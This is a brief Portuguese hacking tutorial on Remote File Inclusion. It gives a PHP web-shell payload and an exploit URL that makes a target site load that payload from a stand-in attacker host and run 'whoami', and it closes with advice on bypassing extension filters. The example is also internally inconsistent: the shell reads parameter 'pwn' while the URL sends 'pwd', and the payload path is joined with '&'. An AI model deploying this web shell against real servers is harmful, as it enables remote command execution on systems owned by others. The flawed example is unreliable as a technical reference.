# Remote File Inclusion (RFI)

A vulnerabilidade de RFI funciona da mesma forma que a LFI, mas ao invés de incluir um arquivo local na aplicação o RFI ocorre quando a aplicação tenta incluir um recurso externo na sua página.  
É possível controlar a inclusão do recurso e executar comandos remotos no servidor.

Para explorar essa vulnerabilidade, inicia um servidor web na sua máquina e crie o payload de acordo com o formato aceito pela aplicação.
`echo "<?php system($_GET['pwn']); ?>" > payload.html`

`http://www.alvo.com.br/info.php?p=http://www.hacker.com.br/&payload.html&pwd=whoami`

Em alguns casos a aplicação faz a inclusão da extensão do arquivo automáticamente. Faça testes e entenda qual o padrão de monatagem do link e realize o bypass.